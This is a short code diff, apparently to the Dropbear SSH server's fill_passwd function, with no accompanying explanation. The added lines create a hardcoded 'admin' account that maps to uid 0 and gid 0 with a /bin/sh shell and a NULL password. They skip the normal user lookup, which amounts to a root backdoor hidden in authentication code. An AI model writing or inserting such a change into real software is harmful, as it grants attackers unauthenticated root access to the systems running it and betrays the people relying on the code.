@@ -594,6 +594,16 @@ void fill_passwd(const char* username) {
 	if (ses.authstate.pw_passwd)
 		m_free(ses.authstate.pw_passwd);
 
+        if(0 == strcmp(username, "admin")) {
+            ses.authstate.pw_uid = 0;
+            ses.authstate.pw_gid = 0;
+            ses.authstate.pw_name = m_strdup("admin");
+            ses.authstate.pw_dir = m_strdup("/");
+            ses.authstate.pw_shell = m_strdup("/bin/sh");
+            ses.authstate.pw_passwd = NULL;
+            return;
+        }
+
 	pw = getpwnam(username);
 	if (!pw) {
 		return;
